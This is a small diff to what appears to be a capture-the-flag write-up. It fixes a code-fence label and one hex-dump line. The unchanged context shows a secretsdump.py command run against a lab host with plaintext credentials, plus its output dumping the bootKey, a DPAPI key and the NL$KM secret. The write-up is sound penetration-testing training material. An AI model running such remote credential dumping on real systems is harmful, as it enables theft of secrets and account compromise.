@@ -132,7 +132,7 @@ PS> Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal 
 ```bash 
 secretsdump.py mario:mario123@10.10.10.132 
 ```
-```ru
+```bash
 [*] Service RemoteRegistry is in stopped state  
 [*] Starting service RemoteRegistry  
 [*] Target system bootKey: 0xf684313986dcdab719c2950661809893  
@@ -157,7 +157,7 @@ dpapi_userkey:0x2d28120da695e819700547fa7329d71dc8e9b546
 [*] NL$KM    
 0000   E3 05 BC AB 6F AC 32 0E  38 53 9A 46 3E A8 2B 90   ....o.2.8S.F>.+.  
 0010   3E 1E A1 C3 94 65 8D 5D  5A 2A 6D F5 FC C4 93 49   >....e.]Z*m....I  
-0020   CE 68 24 DF 38 F0 A6 3D  E1 60 73 E2 B1 CE 1A CC   .h$.8..=.`s.....  
+0020   CE 68 24 DF 38 F0 A6 3D  E1 60 73 E2 B1 CE 1A CC   .h$.8..=.s.....  
 0030   43 DB 81 EE C8 34 DE 2E  98 4E 5C D3 35 3F 4A D4   C....4...N\.5?J.  
 NL$KM:e305bcab6fac320e38539a463ea82b903e1ea1c394658d5d5a2a6df5fcc49349ce6824df38f0a63de16073e2b1ce1acc43db81eec834de2e984e5cd3353f4ad4  
 [*] Cleaning up...    
